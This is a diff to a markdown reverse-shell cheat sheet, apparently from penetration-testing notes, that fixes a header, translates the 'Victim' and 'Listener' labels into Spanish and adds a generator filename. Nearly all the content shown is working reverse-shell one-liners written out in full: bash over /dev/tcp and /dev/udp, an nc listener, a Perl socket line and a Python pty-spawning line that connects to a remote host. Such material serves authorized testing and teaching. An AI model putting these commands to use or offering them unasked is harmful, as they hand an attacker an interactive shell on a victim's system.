@@ -1,7 +1,7 @@
 # REVERSE SHELL
 
 ## Bash 
-###TCP
+### TCP
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -12,10 +12,10 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ### UDP
 
 ```bash
-Victim:
+Victima:
 sh -i >& /dev/udp/127.0.0.1/4242 0>&1
 
-Listener:
+Atacante:
 nc -u -lvp 4242
 ```
 
@@ -34,7 +34,7 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(
 
 ### Linux
 
-IPv4
+IPv4  - (Generator: py1l1.py)
 ```python
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
